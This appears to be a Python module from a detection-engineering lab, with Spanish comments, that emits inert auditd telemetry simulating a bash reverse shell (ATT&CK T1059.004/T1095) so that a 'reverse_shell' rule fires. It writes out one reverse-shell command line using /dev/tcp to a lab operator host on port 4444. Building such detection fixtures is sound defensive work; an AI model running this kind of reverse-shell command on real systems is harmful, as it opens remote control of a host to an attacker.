# ATT&CK T1059.004 / T1095 - Command and Scripting Interpreter / Non-Application Layer Protocol
"""Patrón de shell reversa hacia el operador del laboratorio.

La telemetría reproduce una línea de comando con redirección a /dev/tcp apuntando
al nodo operador del lab (10.20.0.10). Es telemetría inerte: nunca se ejecuta, no
abre ninguna conexión y el destino es un host interno del laboratorio. Dispara
`reverse_shell`.
"""

from __future__ import annotations

from irlab.telemetria import RED_OPERADOR, Reloj, evento_auditd
from simulations._registro import registrar


@registrar("reverse_shell")
def generar(reloj: Reloj) -> list[dict]:
    cmdline = f"bash -c exec 5<>/dev/tcp/{RED_OPERADOR}/4444"
    return [
        evento_auditd(
            reloj,
            exe="/usr/bin/bash",
            cmdline=cmdline,
            key="ejecucion",
            comando="bash",
        )
    ]
